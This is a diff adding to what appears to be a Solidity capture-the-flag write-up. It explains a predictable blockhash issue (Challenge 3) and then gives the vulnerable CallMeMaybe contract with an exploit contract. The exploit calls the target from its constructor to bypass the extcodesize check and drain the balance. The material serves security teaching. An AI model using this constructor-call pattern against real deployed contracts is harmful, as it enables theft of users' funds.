@@ -170,3 +170,55 @@ Solution : Challenge 3
 ---
 
 Take look at the contract and you will see `rand(block.blockhash(games[lastGameId].blockNumber), 100)` it will become `uint256(keccak256(bytes32(0))) % max` you have to wait for the `256` Block to make next call [EVM Limitations](https://docs.soliditylang.org/en/v0.4.21/units-and-global-variables.html#block-and-transaction-properties), in this case which would be 47.
+
+# Challenge 4 : CallMeMaybe
+
+```solidity
+pragma solidity ^0.4.16;
+
+contract CallMeMaybe {
+    modifier CallMeMaybe() {
+      uint32 size;
+      address _addr = msg.sender;
+      assembly {
+        size := extcodesize(_addr)
+      }
+      if (size > 0) {
+          revert();
+      }
+      _;
+    }
+
+    function HereIsMyNumber() CallMeMaybe {
+        if(tx.origin == msg.sender) {
+            revert();
+        } else {
+            msg.sender.transfer(this.balance);
+        }
+    }
+
+    function() payable {}
+}
+```
+
+Solution : Challenge 4
+---
+Here's the modifier if `extcodesize` codesize check for the size of the code and if it `> 0` then it will revert remember at the construction time **contract does not source code at the construction time** so here's the Explotit code.
+
+```solidity
+pragma solidity ^0.4.16;
+contract Attack {
+
+    function Attack() public payable {
+        CallMeMaybe callme = CallMeMaybe("CallMeMaybe_ADDRESS");
+        callme.HereIsMyNumber();
+    }
+
+    function withdraw() public {
+        msg.sender.transfer(address(this).balance);
+    }
+
+    function() payable {}
+}
+```
+
